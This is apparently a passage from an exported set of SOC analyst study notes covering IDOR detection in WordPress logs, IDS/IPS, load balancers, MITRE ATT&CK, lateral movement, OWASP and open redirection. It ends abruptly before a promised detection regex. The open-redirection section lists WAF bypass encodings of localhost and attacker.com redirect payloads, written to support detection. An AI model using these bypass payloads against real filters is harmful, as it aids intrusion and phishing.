information about when the requested resource was modified. This header is used by the caching mechanism.\n-      Content-Type:  The type of data being sent.\n-      Content-Length: The size of the data sent. \nResponse Body\nThe HTTP response body contains the resource sent by the server and requested by the client.\n"},"SOC/SOC-Analyst-Notes/IDOR-Attack":{"slug":"SOC/SOC-Analyst-Notes/IDOR-Attack","filePath":"SOC/SOC Analyst Notes/IDOR Attack.md","title":"IDOR Attack","links":[],"tags":[],"content":"What is IDOR?\nInsecure Direct Object Reference (IDOR) is a vulnerability caused by the absence or improper use of an authorization mechanism. It allows one person to access an object that belongs to another.\n\nIDOR, or “Broken Access Control”, is the number one web application vulnerability listed in the 2021 OWASP.\nHow IDOR Works\nIDOR is not a vulnerability caused by poor sanitation like other web application-based vulnerabilities. The attacker manipulates the parameters sent to the web application, gains access to an object that doesn’t belong to him, and is then able to read, modify, or delete the contents.\nHere’s an example to better understand how the IDOR vulnerability is exploited.\nImagine a simple web application. It retrieves the “id” variable from the user and then displays data that belongs to the user who made the request.\nURL: letsdefend.io/get_user_information\nWhen a request like the one above is made in our web application, it displays the information of the user with an id value of 1.\nIf I am the user who made the request and my ID value is 1, everything will work normally. When I make the request, I see my personal information.\nBut what happens if we make a request with 2 as the “id” parameter? Or 3?\nIf the web application does not check that the “id” value in the request belongs to the person making the request, then anyone can make that request and see the user’s information. This web vulnerability is called IDOR.\nAttackers can access items that do not belong to them by changing parameters such as the “id”. The type of information they can access may vary depending on the web application, but either way, you wouldn’t want anyone to access your personal information, so this is very critical.\nHow Attackers Take Advantage of IDOR Attacks\nWhat an attacker can do is limited by the scope of an IDOR vulnerability. However, the most common areas are usually pages where a user’s information is received. If an attacker were to exploit an IDOR vulnerability, they could:\n\nSteal personal information\nAccess unauthorized documents \nTake unauthorized actions (such as deleting, modifying)\n\nHow to Prevent IDOR\nAlways check that the person making the request is authorized to provide a secure environment without an IDOR vulnerability.\nIn addition, unnecessary parameters should be removed and only the minimum number of parameters should be taken from the user. If we think about the previous example, we don’t need to get the “id” parameter. Instead of getting the “id” parameter from the user, we can use the session information to identify the person who made the request.\nDetecting IDOR Attacks\nIDOR attacks are harder to detect than other attacks. This is because it does not have certain payloads such as SQL injection and XSS.\nHTTP responses would help identify IDOR attacks. However, HTTP responses are not logged for several reasons. This makes it more difficult to identify IDOR attacks.\nA number of methods can be used to identify IDOR attacks. These are:\n\nCheck all parameters: An IDOR vulnerability can occur in any parameter. Therefore, do not forget to check all parameters.\nLook at the number of requests made to the same page: When attackers discover an IDOR vulnerability, they usually want to access the information of all the other users, so they typically perform a brute-force attack. This is why you may see many requests for the same page from one source.\nTry to find a pattern: Attackers will plan a brute-force attack to reach all objects. Since they will be performing the attack on successive and predictable values, such as whole numbers, you can try to find a pattern in the requests you see. For example, if you see requests like id=1, id=2, id=3, you might be suspicious.\n\nA Detection Example\nBelow is a screenshot of logs found on a web server running WordPress.\n\nAs with our other examples, let’s start with a general, broad search. As there are no special characters in the requests made, we can easily read the logs.\nIf you have used Wordpress before, you may know that the “wp-admin/user-edit.php” page contains information about registered Wordpress users. It might seem normal to be able to access this page, in fact, if you have more than one registered user you might be able to access it with more than one “user_id:” parameter. But it is abnormal to have so many different “user_id” parameters.\nIt looks like we have an IDOR attack on our hands.\nWhen we look at the source IP, we see that it belongs to Cloudflare. This means that the web application for which we have got the access log was using a service provided by Cloudflare. So the requests were being sent to the web application through Cloudflare.\nThe fact that the access logs record 15-16 requests within the short time frame shows us that the attack is being carried out with an automated device. If we look at the User-Agent header, we can see that it says “wfuzz/3.1.0”. Wfuzz is a tool that is often used by attackers. So not only have we established that this attack was carried out by an automated scanning tool, but we have also established that it was carried out by a tool called Wfuzz.\nBut we still haven’t answered the most important question.\nWas the attack successful?\nDid the attacker gain access to the users’ information?\nOur job would be easier if we had the HTTP responses. But since we don’t have the HTTP responses, let’s look at the response size in the access logs and make an inference.\nAs we mentioned earlier, the requested page displayed user information. Information such as user names, surnames, and the total size of the user names will not be the same. Therefore, we can ignore requests with a response size of 479 bytes.\nLooking at the requests with response sizes 5691 and 5692, we can see that the response code is 302 (redirect). Successful web requests are usually returned with a response code of 200. So we can assume that the attack was unsuccessful. However, this information alone may not be enough to determine that the attack was definitely unsuccessful.\nThere are 10 requests with the response size of 5692 and 4 with the response size of 5691.\nAs we mentioned before, there is a very small chance that the sum of all information such as user name, surname, and username will be the exact same. This increases the likelihood that the attack was not successful."},"SOC/SOC-Analyst-Notes/Intrusion-Detection-System-(IDS)":{"slug":"SOC/SOC-Analyst-Notes/Intrusion-Detection-System-(IDS)","filePath":"SOC/SOC Analyst Notes/Intrusion Detection System (IDS).md","title":"Intrusion Detection System (IDS)","links":[],"tags":[],"content":"What is IDS?\nAn Intrusion Detection System (IDS) is hardware or software used to detect security breaches and attacks by monitoring a network or host.\nTypes of IDS\nThere are many different types of IDS products:\n\nNetwork Intrusion Detection System (NIDS)\nA Network Intrusion Detection System (NIDS) detects whether there is traffic indicative of attacker behavior by passing all traffic on the network through it. When abnormal behavior is observed in the traffic, an alert can be generated and the administrator can be informed.\nHost Intrusion Detection System (HIDS)\nA Host Intrusion Detection System (HIDS) works on a specific host in the network. It tries to detect malicious activities by examining all network packets coming to this device and all network packets going from this device. Detected malicious behaviors are reported to the administrator as an alert.\nProtocol-Based Intrusion Detection System (PIDS)\nA Protocol-Based Intrusion Detection System (PIDS) is a type of IDS that examines the traffic between a server and a client in a protocol-specific way.\nApplication Protocol-Based Intrusion Detection System (APIDS)\nAn Application Protocol-Based Intrusion Detection System (APIDS) is a type of IDS that tries to detect security breaches by monitoring communication in application-specific protocols.\nHybrid Intrusion Detection System\nA Hybrid Intrusion Detection System is a type of IDS in which two or more violation detection approaches are used together.\nFunctions of IDS\n\nDetecting security breaches according to the detection methods used by the IDS product is the main task of the IDS product.\nWhen IDS detects a security breach, the administrator is informed, and/or this information is sent to the SIEM product.\n\nNote: For detailed information about “SIEM”, you can refer to the [SIEM 101 training](app.letsdefend.io/training/lessons/siem-101.\nImportance of IDS for Security\nIDS is a product developed to detect malicious behavior. It can be said that security is lacking in a network without IDS because IDS is one of the products that has reached a certain technological maturity. Due to its task, it is very important to detect security breaches. It is recommended to be used with other security products rather than alone. Since the IDS product does not have the ability to take action, it will be more effective to use it with a security product that has the ability to take additional action.\nSome popular IDS products used in the cybersecurity industry are as follows:\n\nZeek/Bro\nSnort\nSuricata\nFail2Ban\nOSSEC\n\nWhat log sources does the IDS have?\nDuring its operation, IDS detects security violations according to previously established rules. Therefore, it is very important how well the written rule defines the attack. If the written rule cannot detect the attack or detects normal behavior as an anomaly, the rule should be changed or the incoming alerts should be reviewed by the analyst. Among the IDS logs examined by the analyst, there is information in the network packets regarding the security breach.\nNote: For detailed information about IDS logs, you can refer to the Network Log Analysis training.\nPhysical Location of the IDS Device\nThe location of the IDS device in the network may vary depending on which type of IDS it is. For example, a NIDS-type device must pass all packets coming into the network over it. Therefore, it is more suitable to be positioned close to the network devices that provide access to the external network. A HIDS-type device, on the other hand, should be positioned close to the host in the network because it only examines the network packets coming to and leaving a certain host.\n"},"SOC/SOC-Analyst-Notes/Intrusion-Prevention-System-(IPS)":{"slug":"SOC/SOC-Analyst-Notes/Intrusion-Prevention-System-(IPS)","filePath":"SOC/SOC Analyst Notes/Intrusion Prevention System (IPS).md","title":"Intrusion Prevention System (IPS)","links":[],"tags":[],"content":"What is IPS?\nAn Intrusion Prevention System (IPS) is hardware or software that detects security violations by monitoring a network or host and prevents security violations by taking the necessary action.\nTypes of IPS\nThere are many different types of IPS products:\n\n1. Network-Based Intrusion Prevention System (NIPS)\nNetwork-based intrusion prevention system (NIPS) is a type of IPS that detects security violations and eliminates security violations by monitoring all incoming traffic to the network it is in.\n2. Host-Based Intrusion Prevention System (HIPS)\nHost-based intrusion prevention system (HIPS) is software that monitors and analyzes suspicious activities for a host.\n3. Network Behavior Analysis (NBA)\nNetwork Behavior Analysis (NBA) is a type of IPS that detects and blocks unusual traffic flows and Denial of Service (DoS) attacks on the network.\n4. Wireless Intrusion Prevention System (WIPS)\nA Wireless Intrusion Prevention System (WIPS) is a type of IPS that monitors and analyzes wireless network protocol traffic of wireless devices in a network.\nFunctions of IPS\n\nIPS is responsible for preventing malicious behavior by detecting security breaches.\nIt notifies the relevant authorities of the security breach encountered during monitoring as an alert.\n\nThe Importance of IPS for Security\nIPS is an important security product that should be included in an organization. Having the ability to take action against the security breach it has detected makes a great contribution to ensuring security. As with any security solution, it must be used and configured correctly. It is not recommended to be installed and left to work without constant control by the personnel. It must be followed by the cyber security personnel whether the IPS product is working or not and whether it takes the right action.\nSome popular IPS products used within the cybersecurity industry are as follows:\n\nCisco NGIPS\nSuricata\nFidelis\n\nWhat log resources does IPS have?\nThe IPS device has log content similar to the IDS device. In terms of their duties, IDS and IPS have similar features at one point. Some of the information that can be included in the IPS logs is as follows:\n\nDate/Time Information\nMessage About the Attack\nSource IP Address\nSource Port\nDestination IP Address\nDestination Port\nAction Information\nDevice Name\n\nNote: For detailed information about IPS logs, you can refer to the Network Log Analysis training.\nPhysical Location of IPS Device\nThe location of the IPS device in the network may vary depending on which type of IPS it is. In general terms, it should be placed at whatever point it needs to be located in the network due to its task.\n"},"SOC/SOC-Analyst-Notes/Load-Balancer":{"slug":"SOC/SOC-Analyst-Notes/Load-Balancer","filePath":"SOC/SOC Analyst Notes/Load Balancer.md","title":"Load Balancer","links":[],"tags":[],"content":"What is a Load Balancer?\nLoad Balancer is a hardware or software used to distribute the traffic to the servers in a balanced way and is placed in front of the servers.\nBenefits of Load Balancer\nLoad Balancer is an important tool for the IT sector with many advantages. The benefits of the load balancer device, which plays a critical role in the distribution of network traffic, are shown below:\n\nLogic Behind How Load Balancer Operates\nThe load balancer detects the most suitable target using some important mathematical algorithms while performing the load-balancing process and directs the network packets to the appropriate target. In this way, the overloading of a server behind the load balancer is prevented. For example, the possible traffic flow when no load balancer is used is as follows:\n\nAs can be seen in the image above, as an undesirable situation, “server1” has become overloaded and cannot process packets. This situation causes a delay that the user or the client device using the server does not want. To prevent this situation, a load balancer should be used. For example, the following image shows the possible traffic flow when the load balancer device is used:\n\nAs seen in the image above, the resources of the system and servers are used much more effectively with balanced load distribution, preventing delays and loss of access.\nThe Importance of Load Balancer for Security\nThe load balancer is a very important component of an organization due to its duty. Continuing the services of the organization uninterrupted can be very critical for the organization. Therefore, for access security, load balancer devices/software should be placed in the necessary parts and correctly configured and monitored. Otherwise, the services of the organization may be interrupted, causing the organization to experience a loss of prestige or financial loss. For example, if we consider that DoS/DDoS attacks are aimed at preventing the services of the organization, we can more easily understand the importance of load balancers in this sense.\nDoS (Denial of Service): It is called attacking to render the service inoperable by sending more network traffic than the target system can handle. In short, it can be said to cause disruption of the service provided by consuming resources towards the target.\nSome popular Load Balancer products used in the cyber security industry are as follows:\n\nNginx\nF5\nHAProxy\nCitrix\nAzure Traffic Manager\nAWS\n"},"SOC/SOC-Analyst-Notes/MITRE-ATT-and-CK-Framework":{"slug":"SOC/SOC-Analyst-Notes/MITRE-ATT-and-CK-Framework","filePath":"SOC/SOC Analyst Notes/MITRE ATT&CK Framework.md","title":"MITRE ATT&CK Framework","links":["SOC/SOC-Analyst-Notes/MITRE-ATT-and-CK-Matrix","SOC/SOC-Analyst-Notes/MITRE-ATT-and-CK-Tactics","SOC/SOC-Analyst-Notes/MITRE-ATT-and-CK-Technics--and--Sub-Techniques","SOC/SOC-Analyst-Notes/MITRE-ATT-and-CK-Mitigations","SOC/SOC-Analyst-Notes/APT-Groups","SOC/SOC-Analyst-Notes/Phishing"],"tags":[],"content":"\nIntroduction\nWhat even is this MITRE thing? 🤔\nMITRE ATT&amp;CK that stands for Adversarial Tactics, Techniques, and Common Knowledge is the framework of a knowledge database that has been continuously developed and expanded along with the technology in cybersecurity\nWhy is it so important? 🤷‍♂️\nEach step of cyber attacks is covered in detail in the MITRE ATT&amp;CK Framework, SOC Analysts can clearly map attacks, prevent them, and an in-depth report can be written and the details of the attack can be archived for a later use. Since this framework provides a clear roadmap of cyber attacks, researches can be conducted on other possible cyber attacks that have not yet occurred yet to develop ways to detect or avoid them.\nThe Framework\n1. MITRE ATT&amp;CK Matrix\n2. MITRE ATT&amp;CK Tactics\n3. MITRE ATT&amp;CK Technics &amp; Sub-Techniques\n4. MITRE ATT&amp;CK Mitigations\n5. MIRE ATT&amp;CK Software\n6. APT Groups\nNext: Phishing"},"SOC/SOC-Analyst-Notes/MITRE-ATT-and-CK-Matrix":{"slug":"SOC/SOC-Analyst-Notes/MITRE-ATT-and-CK-Matrix","filePath":"SOC/SOC Analyst Notes/MITRE ATT&CK Matrix.md","title":"MITRE ATT&CK Matrix","links":["SOC/SOC-Analyst-Notes/MITRE-ATT-and-CK-Framework"],"tags":[],"content":"What is ATT&amp;CK Matrix? 🤔\nMITRE ATT&amp;CK Matrix is a visualization method used to classify and see attack methods of cyber attackers. Matrices can be customized for almost any subject and turned into useful visuals. MITRE has created MITRE ATT&amp;CK matrices to visualize the details of attacker behavior using the matrices.\nTypes of Matrices 🌳\n3 different matrices have been created within the MITRE ATT&amp;CK Framework according to the platform types:\n\nEnterprise Matrix\nMobile Matrix\nICS (Industrial Control Systems) Matrix\n\n1. Enterprise Matrix 🏢\nEnterprise matrix is the first matrix created by MITRE. There are more digital systems included in this matrix and are more common than those that are included in other matrices, so there are a lot more information in this matrix than other matrices. Enterprise matrix is mainly used to understand the cyber attacks on large organizations.\nThe following image shows the enterprise matrix in detail:\n\nSub-matrices 🌿\nThere are 7 sub-matrices under the Enterprise Matrix:\n\nPRE\nWindows\nmacOS\nLinux\nCloud\nNetwork\nContainers\n\nYou can access the Enterprise Matrix and its sub-matrices at the following link and can learn more about them:\nEnterprise Matrix: attack.mitre.org/matrices/enterprise/ \n\n2. Mobile Matrix 📱\nThe mobile matrix is the one that was prepared for mobile devices and contains information about the cyber security of mobile devices. This matrix can be used to ensure the security of individual and corporate mobile devices. Comparing the Enterprise Matrix, it contains less information:\nThe following image shows the mobile matrix:\n\nMobile Matrix: attack.mitre.org/matrices/mobile/ \nSub-matrices 🌿\nMobile Matrix has 2 sub-matrices:\n\nAndroid\niOS\n\n\n3. ICS Matrix 🏭\nThe ICS Matrix is the one that contains the information collected for the cyber security of devices in the industrial control systems. This matrix can be used to provide cyber security and analyses of an ICS.\nThe following image shows the ICS matrix:\n\nICS Matrix: attack.mitre.org/matrices/ics/"},"SOC/SOC-Analyst-Notes/MITRE-ATT-and-CK-Mitigations":{"slug":"SOC/SOC-Analyst-Notes/MITRE-ATT-and-CK-Mitigations","filePath":"SOC/SOC Analyst Notes/MITRE ATT&CK Mitigations.md","title":"MITRE ATT&CK Mitigations","links":["SOC/SOC-Analyst-Notes/MITRE-ATT-and-CK-Matrix"],"tags":[],"content":"What are Mitigations?\nMitigations refers to the measures and actions that can be taken in response to the techniques in the MITRE ATT&amp;CK Matrix. Each mitigation has a unique ID, name and description that provides clear understanding about them.\ne.g., the image below shows one of the enterprise mitigations:\n\nTypes of Mitigations\nMitigations are grouped into 3 for the matrices as in other MITRE ATT&amp;CK components:\n\nEnterprise Mitigations\nMobile Mitigations\nICS Mitigations\n\nEnterprise Mitigations\n\nThe number of enterprise mitigations: 43\nMobile Mitigations\n\nThe number of mobile mitigations: 11\nICS Mitigations\n\nThe number of ICS mitigations: 51"},"SOC/SOC-Analyst-Notes/MITRE-ATT-and-CK-Tactics":{"slug":"SOC/SOC-Analyst-Notes/MITRE-ATT-and-CK-Tactics","filePath":"SOC/SOC Analyst Notes/MITRE ATT&CK Tactics.md","title":"MITRE ATT&CK Tactics","links":["SOC/SOC-Analyst-Notes/MITRE-ATT-and-CK-Framework","SOC/SOC-Analyst-Notes/Reconnaissance","HTB/Privilege-Escalation"],"tags":[],"content":"What is Tactic?\nTactic expresses the purpose of the cyber attacker and the reason for his action. Tactics are one of the most important MITRE ATT&amp;CK Framework components used to group cyber attacker behaviors and see the attack steps. Tactics are in the top row of the matrix.\ne.g., the tactics on the enterprise matrix are shown in the image below:\n\nTypes of Tactics\nTactics often consist of general statements as they express the purpose and reason for the cyber attack. Therefore, the tactics for each matrix are highly similar.\nFor example, the image below shows detailed information about the “Initial Access” tactic belonging to the enterprise matrix:\n\nThe tactic numbers and names in each matrix are given in the titles below.\n1. Enterprise Tactics \nThere are 14 tactics in the Enterprise matrix as in the list below:\n\nReconnaissance\nResource Development\nInitial Access\nExecution\nPersistence\nPrivilege Escalation\nDefense Evasion\nCredential Access\nDiscovery\nLateral Movement\nCollection\nCommand and Control\nExfiltration\nImpact\n\nYou can access each tactic under the Enterprise matrix from the navigation menu on the left of the page at the link above.\n2. Mobile Tactics \nThere are 14 tactics in the Mobile matrix as in the list below:\n\nInitial Access\nExecution\nPersistence\nPrivilege Escalation\nDefense Evasion\nCredential Access\nDiscovery\nLateral Movement\nCollection\nCommand and Control\nExfiltration\nImpact\nNetwork Effects\nRemote Service Effects\n\n3. ICS Tactics\nThere are 12 tactics in the ICS matrix as in the list below:\n\nInitial Access\nExecution\nPersistence\nPrivilege Escalation\nEvasion\nDiscovery\nLateral Movement\nCollection\nCommand and Control\nInhibit Response Function\nImpair Process Control\nImpact\n"},"SOC/SOC-Analyst-Notes/MITRE-ATT-and-CK-Technics--and--Sub-Techniques":{"slug":"SOC/SOC-Analyst-Notes/MITRE-ATT-and-CK-Technics--and--Sub-Techniques","filePath":"SOC/SOC Analyst Notes/MITRE ATT&CK Technics & Sub-Techniques.md","title":"MITRE ATT&CK Technics & Sub-Techniques","links":["SOC/SOC-Analyst-Notes/Reconnaissance"],"tags":[],"content":"What are Techniques and Sub-Techniques?\nThe tactics within the matrix only show what the attackers aim and do not contain detailed information about the attacker’s attack method. The techniques and sub-techniques, on the other hand show the methods used by the attacker to achieve his goal and how he conducted the attack exactly. As an example, some of the techniques on the enterprise matrix are shown in the image below:\n\nThe majority of the areas in the matrix in the image above is techniques. Some techniques have sub-techniques and some do not.\nAs it is shown in the image above, If there are gray areas next to the boxes where the names of the techniques are written in the matrix, it indicates that the technique has a sub-technique. For example, let’s see the sub-techniques of the first 4 techniques under the “Reconnaissance” tactic:\n\nTypes of Techniques and Sub-Techniques\nTechniques are divided into 3 groups according to matrices:\n\nEnterprise Techniques\nMobile Techniques\nICS Techniques\n\nEnterprise Techniques\nThere are quite a number of enterprise techniques and are constantly updated over the time. The current number (10.05.2023) of enterprise techniques and sub-techniques is as follows:\nTechniques: 193\nSub-techniques: 401\nMobile Techniques\nTotal number of mobile techniques is less than the enterprise techniques and they are updated over the time as well. The current number (10.05.2023) of the mobile techniques and sub-techniques is as follows:\nTechniques: 66\nSub-techniques: 41\nICS Techniques\nAs with the techniques of other matrices, ICS techniques are also updated over the  time. The current number (10.05.2023) of ICS techniques and sub-techniques is as follows:\nTechniques: 79\nSub-techniques: 0\nWhat is Procedure?\nThe procedure consists of usage examples of techniques/sub-techniques. It simply shows which tool/software was utilized during the implementation of the technique. In other words, it is the explanation of the practical information on the use of the technique.\nAn example of the procedure for the “OS Credential Dumping” technique is in the image below:\n\nProcedures can also be accessed through the page where the techniques are located."},"SOC/SOC-Analyst-Notes/Masquerading":{"slug":"SOC/SOC-Analyst-Notes/Masquerading","filePath":"SOC/SOC Analyst Notes/Masquerading.md","title":"Masquerading","links":["SOC/SOC-Analyst-Notes/Masquerading"],"tags":[],"content":"Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading."},"SOC/SOC-Analyst-Notes/Network-Propagation":{"slug":"SOC/SOC-Analyst-Notes/Network-Propagation","filePath":"SOC/SOC Analyst Notes/Network Propagation.md","title":"Network Propagation","links":["SOC/SOC-Analyst-Notes/C2","HTB/Privilege-Escalation"],"tags":[],"content":"After a device is exploited in a network, the adversary spreads its access through the network.\nExploiting more devices in the same network becomes a lot more easier because usually:\n\nCredentials to other devices may be insecurely stored on host\nHost might have exclusive access to other devices such as printers and storages, not open to public\n\nHence, the attacker would set up a base on one of the systems to act as their pivot point and use it to gather information about the internal network.\nNetwork Propagation Process\n\nPivoting\n(MITRE Tactic TA0008)\nOnce the attacker has access to the system, they would use it as their staging site and a tunnel between their C2 Server and the victim’s network. The system would also be used as the distribution point for all malware and backdoors at later stages.\nDiscovery\n(MITRE Tactic TA0007)\nThe adversary would uncover information about the system and the network it is connected to. Within this stage, the knowledge base would be built from the active user accounts, the permissions granted, applications and software in use, web browser activity, files, directories and network shares, and system configurations.\nPrivilege Escalation\n(MITRE Tactic TA0004)\nFollowing their knowledge-gathering, the adversary would try to gain more prominent permissions within the pivot system. They would leverage the information on the accounts present with vulnerabilities and misconfigurations found to elevate their access to one of the following superior levels:\n\nSYSTEM/ ROOT.\nLocal Administrator.\nA user account with Admin-like access.\nA user account with specific access or functions.\n\nExecution\n(MITRE Tactic TA0002)\nThis is where they deploy their malicious code using the pivot system as their host. Remote trojans, C2 scripts, malicious links and scheduled tasks are deployed and created to facilitate a recurring presence on the system and uphold their persistence.\nCredential Access\n(MITRE Tactic TA0006)\nWorking hand in hand with the Privilege Escalation stage, the adversary would attempt to steal account names and passwords through various methods, including keylogging and credential dumping. This makes them harder to detect during their attack as they would be using legitimate credentials.\nTools like Mimikatz can be used for credential dumping.\nLateral Movement\n(MITRE Tactic TA0008)\nWith the credentials and elevated privileges, the adversary would seek to move through the network and jump onto other targeted systems to achieve their primary objective. The stealthier the technique used, the better."},"SOC/SOC-Analyst-Notes/OSINT":{"slug":"SOC/SOC-Analyst-Notes/OSINT","filePath":"SOC/SOC Analyst Notes/OSINT.md","title":"OSINT","links":[],"tags":[],"content":"Open source intelligence (OSINT) is the act of gathering and analyzing publicly available data for intelligence purposes."},"SOC/SOC-Analyst-Notes/OWASP":{"slug":"SOC/SOC-Analyst-Notes/OWASP","filePath":"SOC/SOC Analyst Notes/OWASP.md","title":"OWASP","links":[],"tags":[],"content":"The Open Web Application Security Project (OWASP) is a non-profit foundation dedicated to improving software security.\nWithout a doubt, OWASP is one of the best resources for information on web application security.\nOWASP Top Ten\nEvery few years, OWASP publishes a list of the 10 web application vulnerabilities that pose the most critical security risks. The latest release was in 2021 at the time of writing.\n\nThe 2021 OWASP list contains these critical vulnerabilities:\n\nBroken Access Control\nCryptographic Failures\nInjection\nInsecure Design\nSecurity Misconfiguration\nVulnerable and Outdated Components\nIdentification and Authentication Failures\nSoftware and Data Integrity Failures\nSecurity Logging and Monitoring Failures\nServer-Side Request Forgery (SSRF)\n"},"SOC/SOC-Analyst-Notes/Open-Redirection-Attack":{"slug":"SOC/SOC-Analyst-Notes/Open-Redirection-Attack","filePath":"SOC/SOC Analyst Notes/Open Redirection Attack.md","title":"Open Redirection Attack","links":["SOC/SOC-Analyst-Notes/Phishing","SOC/SOC-Analyst-Notes/OWASP"],"tags":[],"content":"What is Open Redirection?\nOpen redirection is a web security vulnerability that occurs when a website or web application redirects users to a different URL without proper validation or sanitization of the target URL. Attackers can exploit Open Redirection to trick users into visiting malicious websites or performing actions unintended by the website owner.\nIn an open redirection attack, an attacker typically crafts a legitimate URL hosted on the vulnerable website, but includes a malicious URL as a parameter or query string. When a user clicks on the crafted URL, the website’s redirect mechanism automatically redirects the user to the malicious URL, which can lead to various malicious activities, such as Phishing attacks, spreading malware, or stealing sensitive information.\nOpen redirection vulnerabilities commonly occur when websites use user-supplied input, such as URLs, as part of their redirect mechanism without proper validation or sanitization. To prevent open redirection attacks, web developers should validate and sanitize all user-supplied input used in redirections, and ensure that only trusted and whitelisted URLs are allowed for redirection. Additionally, it’s important to implement proper authentication and authorization mechanisms to ensure that only authenticated and authorized users can perform redirects. Regular security testing, including vulnerability scanning and penetration testing, can also help identify and fix open redirection vulnerabilities in web applications.\nOpen Redirection Types / Possible Vectors\n1. URL-based open redirection\nThis is the most common type of open redirection vulnerability. It occurs when a website takes a URL or a URL parameter as input and uses it in a redirect without proper validation or sanitization. An attacker can craft a malicious URL that includes a different domain or malicious URL as a parameter which will be included in the redirect, leading to an unintended redirection to a malicious website.\n2. JavaScript-based open redirection\nThis type of open redirection vulnerability occurs when a website uses JavaScript to perform a redirect, but the target URL is obtained from untrusted or user-controlled sources without proper validation or sanitization. An attacker can manipulate the JavaScript code or input data to execute a malicious redirect to a different domain or URL.\n3. Meta refresh-based open redirection\nThis type of open redirection vulnerability occurs when a website uses the HTML “meta refresh” tag to redirect users to another URL automatically, and the target URL is obtained from untrusted or user-controlled sources without proper validation or sanitization. An attacker can manipulate the meta refresh tag or input data to trigger a malicious redirect to a different domain or URL.\n4. Header-based open redirection\nThis type of open redirection vulnerability occurs when a website uses HTTP headers, such as “Location” header, to perform a redirect, but the target URL is obtained from untrusted or user-controlled sources without proper validation or sanitization. An attacker can manipulate the header value or input data to trigger a malicious redirect to a different domain or URL.\n5. Parameter-based open redirection\nThis type of open redirection vulnerability occurs when a website uses a parameter in the URL or in a form submission as part of the redirect process, but fails to properly validate or sanitize the parameter value. An attacker can manipulate the parameter value to trigger a redirect to a malicious URL.\nIt’s important for web developers to be aware of these different types of open redirection vulnerabilities and implement proper validation and sanitization of user-supplied input to prevent such vulnerabilities in their web applications.\nHow Open Redirection Works?\nHere’s an example of a vulnerable code in a web application that demonstrates an open redirection vulnerability using PHP:\n\nIn this example, the web application takes a target URL as a query parameter (url) from the user and uses it in a redirect without validating or sanitizing the input. This can lead to an open redirection vulnerability, as an attacker can craft a malicious URL and pass it as the url parameter, leading to unintended redirection to a malicious website.\nFor example, an attacker could create a URL like this:\n\nWhen a user clicks on this URL, the vulnerable application will automatically redirect the user to malicious.com, which could be a phishing website or a site hosting malware.\nImpact of Open Redirection\nOpen redirection vulnerabilities can have a significant impact on the security of a web application and its users. Some of the potential impacts of open redirection vulnerabilities include:\n1. Phishing attacks:\nAttackers can craft malicious URLs that appear legitimate and trick users into clicking on them, leading to unintended redirection to a phishing website. Phishing attacks aim to steal sensitive information, such as usernames, passwords, and financial details, from unsuspecting users.\n2. Malware distribution:\nAttackers can redirect users to websites hosting malware, which can result in the automatic download and installation of malicious software on the user’s device. This can lead to malware infections, data breaches, and other types of cyber attacks.\n3. Social engineering attacks:\nAttackers can use open redirection vulnerabilities to conduct social engineering attacks, where they manipulate users into taking unintended actions, such as downloading malware, making fraudulent payments, or revealing sensitive information.\n4. Reputation damage:\nIf a website is found to have open redirection vulnerabilities, it can result in reputational damage for the website owner or organization. Users may lose trust in the website’s security and reliability, leading to loss of business, brand damage, and financial repercussions.\n5. Legal and regulatory consequences:\nOpen redirection vulnerabilities can result in legal and regulatory consequences, especially if sensitive user information is compromised. Organizations may face legal liabilities, fines, or other penalties for failing to protect user data and secure their web applications.\nPrevention Methods\nweb developers should follow secure coding practices and implement proper input validation and sanitization techniques. Here are some preventive measures that can be taken:\nValidate and sanitize input: Always validate and sanitize any user-supplied input that is used in the redirection process. This includes URL parameters, form submissions, and any other input that is used in generating redirect URLs. Validate that the input conforms to expected formats, such as valid URLs or whitelisted domains, and sanitize it to remove any malicious or unexpected characters.\nUse a whitelist approach: Instead of trying to blacklist or filter out specific characters or patterns from user input, it’s generally safer to use a whitelist approach where only known and trusted values are allowed. Define a whitelist of trusted domains or URLs to which the application is allowed to redirect, and validate that the user-supplied input matches the whitelist.\nAvoid using user-controlled data in redirects: Avoid using user-controlled data, such as input from URL parameters or form submissions, directly in the redirect process. If possible, use other means of redirection, such as using HTTP headers or server-side redirects that do not rely on user-controlled data.\nImplement proper authorization and authentication: Ensure that only authorized users are allowed to trigger redirects. Implement proper authentication and authorization mechanisms to verify the legitimacy of the user and their actions.\nImplement secure coding practices: Follow secure coding practices, such as using secure coding libraries or frameworks, keeping software up-to-date with the latest security patches, and conducting regular security reviews and vulnerability assessments.\nEducate users about potential risks: Educate users about the potential risks of clicking on suspicious or unexpected URLs, and encourage them to be cautious when clicking on links from unknown sources or providing personal information on websites.\nStay informed about web security best practices: Stay updated with the latest web security best practices and guidelines, such as the OWASP Top Ten Project, and incorporate them into your development processes.\nBy implementing these preventive measures and following secure coding practices, web developers can significantly reduce the risk of open redirection vulnerabilities in their web applications and protect their users from potential attacks. Regular security testing, including penetration testing and vulnerability assessments, can also help identify and mitigate any potential vulnerabilities in the application.\nHere’s an example of a vulnerable code in PHP that demonstrates an open redirection vulnerability, along with a fixed version:\n\nFixed Code:\n\nIn the fixed version, the **filter_var** function with **FILTER_VALIDATE_URL** filter is used to validate the user-supplied url parameter. This filter checks if the value is a valid URL according to the PHP filter extension, and if it returns true, the redirect is performed to the validated URL. If the url parameter does not pass the validation, a default URL or an error message can be shown, and no redirection is performed. This helps to prevent malicious URLs or invalid values from being used in the redirection process, mitigating the open redirection vulnerability.\nDetecting Open Redirect Attacks\nWhat was described in Part 1 was a list of things to do from the perspective of a hacker/attacker. At the same time, the issues that a developer should pay attention to while developing were also mentioned.\nSo in this part, let’s have a look at how to detect Open Redirection attacks with an example. But, before moving, let’s quickly recap some of the important things to detect Open Redirection attacks;\n\nIf there is a consecutive requests to query string parameters such as ?next (website.com/param.php), or ?url ( website.com/…?url=), with payloads like attacker.com or attacker.com (URL structure)\nFor the WAF or other middleware products, sometimes payloads can have bypass techniques like;\n\nLocalhost\n\nhttp://[::]:25/\nhttp://①②⑦.⓪.⓪.⓪\n\n\nCDIR\n\nhttp://127.0.0.0\n\n\nDecimal Bypass\n\nhttp://2130706433/ = http://127.0.0.1\n\n\nHexadecimal Bypass\n2. http://0x7f000001/ = http://127.0.0.1\n\n\nEncoded characters like %2f = /\n\nOf course it’s not possible to detect or analyze web server logs without using automated detection methods. For an easier way, any SOC analyst can use the following regex to detect open redirection attacks. 